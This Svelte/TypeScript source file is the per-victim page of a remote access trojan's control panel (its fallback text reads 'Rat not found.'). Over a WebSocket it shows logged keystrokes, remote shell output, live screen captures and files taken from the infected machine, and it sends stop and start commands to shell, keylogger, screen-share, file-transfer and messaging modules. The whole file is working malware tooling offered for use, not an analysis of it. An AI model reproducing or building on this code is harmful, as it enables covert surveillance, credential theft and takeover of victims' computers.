<script lang="ts">
	import { page } from '$app/stores';
	import { onMount } from 'svelte';
	import type { Seeker } from '$lib/types';
	import { writable } from 'svelte/store';
	import ShellComponent from '$lib/components/ShellComponent.svelte';
	import KeyloggerComponent from '$lib/components/KeyloggerComponent.svelte';
	import InfoComponent from '$lib/components/InfoComponent.svelte';
	import MessageComponent from '$lib/components/MessageComponent.svelte';
	import ScreenShareComponent from '$lib/components/ScreenShareComponent.svelte';
	import FileTransferComponent from '$lib/components/FileTransferComponent.svelte';
	import NotificationComponent from '$lib/components/NotificationComponent.svelte';

	let seeker: Seeker | null = null;
	let ws: WebSocket | null = null;
	const connected = writable(false);
	const keylogs = writable<string[]>([]);
	const shellOutput = writable<string[]>([]);
	const screenShareFrame = writable<string>('');
	const fileTransferOutput = writable<string[]>([]);
    const currentCwd = writable<string>('No current working directory');

	function decodeHtml(html: string): string {
		const txt = document.createElement('textarea');
		txt.innerHTML = html;
		return txt.value;
	}

	function parseKeylogs(keylogsString: string): string[] {
		const result: string[] = [];
		let current = '';
		let inTag = false;

		for (let i = 0; i < keylogsString.length; i++) {
			const char = keylogsString[i];
			if (char === '<') {
				if (current) result.push(current);
				current = char;
				inTag = true;
			} else if (char === '>' && inTag) {
				current += char;
				result.push(current);
				current = '';
				inTag = false;
			} else if (!inTag && char !== '<') {
				if (current) result.push(current);
				result.push(char);
				current = '';
			} else {
				current += char;
			}
		}
		if (current) result.push(current);
		return result;
	}

	function extractPath(message: string) {
		const pathRegex = /^[A-Z]:\\(?:[^\\:*?"<>|\r\n]+\\)*[^\\:*?"<>|\r\n]*/i;
		const match = message.match(pathRegex);
		return match ? match[0] : null;
	}

	$: if (seeker?.keylogs) {
		const decoded = decodeHtml(seeker.keylogs);
		keylogs.set(parseKeylogs(decoded));
	}

	async function setSeeker(id: string) {
		const res = await fetch(`/api/seekers`);
		if (!res.ok) {
			console.error('Fetch error:', res.status, res.statusText);
			return;
		}
		const seekers: Record<string, Seeker> = await res.json();
		seeker = seekers[id] ?? null;
		console.log(seeker);
		connected.set(!seeker?.disconnected);
	}

	onMount(() => {
		const id = $page.params.id;
		setSeeker(id);

		ws = new WebSocket(`ws://localhost:8080/ws/frontend/${id}`);

		ws.onmessage = async (event) => {
			console.log('Message from server:', event.data);
			try {
				const message = JSON.parse(event.data);
				switch (message.type) {
					case 'SeekerConnected':
						if (message.data === id) {
							console.log('Seeker connected.');
							await setSeeker(id);
							connected.set(true);
						}
						break;
					case 'SeekerReconnected':
						if (message.data === id) {
							console.log('Seeker reconnected.');
							await setSeeker(id);
							connected.set(true);
						}
						break;
					case 'SeekerDisconnected':
						if (message.data === id) {
							console.log('Seeker disconnected.');
							connected.set(false);
                            shellOutput.set([]);
							fileTransferOutput.set([]);
                            currentCwd.set('No current working directory');
						}
						break;
					case 'keylogger_keys':
						if (seeker) {
							const decoded = decodeHtml(message.data as string);
							seeker.keylogs += decoded;
							keylogs.set(parseKeylogs(seeker.keylogs));
						}
						break;
					case 'keylogger_output':
						console.log('Keylogger output:', message.data);
						break;
					case 'shell_output':
						shellOutput.update((arr) => [...arr, message.data as string]);
						const path = extractPath(message.data);
						if (path) {
							currentCwd.set(path);
							fileTransferOutput.update((arr) => [...arr, `[Info] Current working directory: ${path}`]);
						}
                        break;
					case 'screenshare_frame':
						screenShareFrame.set(message.data as string);
						break;
					case 'screenshare_output':
						console.log('Screen share output:', message.data);
						break;
					case 'file_transfer_output':
						fileTransferOutput.update((arr) => [...arr, message.data as string]);
						break;
					case 'file_download_response':
						try {
							const file_data = JSON.parse(message.data);
							if (file_data.content && file_data.filename) {
								const link = document.createElement('a');
								link.href = `data:application/octet-stream;base64,${file_data.content}`;
								link.download = file_data.filename;
								link.click();
								fileTransferOutput.update((arr) => [
									...arr,
									`[Success] Downloaded ${file_data.filename}`
								]);
							} else {
								fileTransferOutput.update((arr) => [...arr, `[Error] Invalid file data received`]);
							}
						} catch (e) {
							fileTransferOutput.update((arr) => [
								...arr,
								`[Error] Failed to process download: ${e}`
							]);
						}
						break;
					default:
						console.warn('Unknown message type:', message.type);
				}
			} catch (err) {
				console.error('Failed to parse message:', err);
			}
		};

		return () => {
			ws?.close();
			sendMessage('screenshare_command', 'stop');
			sendMessage('keylogger_command', 'stop');
			sendMessage('shell_command', 'stop');
			shellOutput.set([]);
			fileTransferOutput.set([]);
		};
	});

	function sendMessage(type: string, data: string) {
		if (ws?.readyState === WebSocket.OPEN) {
			const message = { type, data };
			ws.send(JSON.stringify(message));
		} else {
			console.warn('WebSocket not connected.');
		}
	}
</script>

{#if seeker}
	<div class="p-6 bg-gray-800 rounded shadow-lg space-y-6">
		<InfoComponent {seeker} {connected} />
		<ShellComponent {sendMessage} {shellOutput} />
		<ScreenShareComponent {sendMessage} {screenShareFrame} />
		<KeyloggerComponent {sendMessage} {keylogs} />
		<FileTransferComponent {sendMessage} {fileTransferOutput} {currentCwd} />
        <NotificationComponent {sendMessage} />
		<MessageComponent {sendMessage} />
	</div>
{:else}
	<p class="text-gray-300">Rat not found.</p>
{/if}

<style>
	::-webkit-scrollbar {
		width: 8px;
	}
	::-webkit-scrollbar-track {
		background: #1f2937;
	}
	::-webkit-scrollbar-thumb {
		background: #4b5563;
		border-radius: 4px;
	}
	::-webkit-scrollbar-thumb:hover {
		background: #6b7280;
	}
</style>
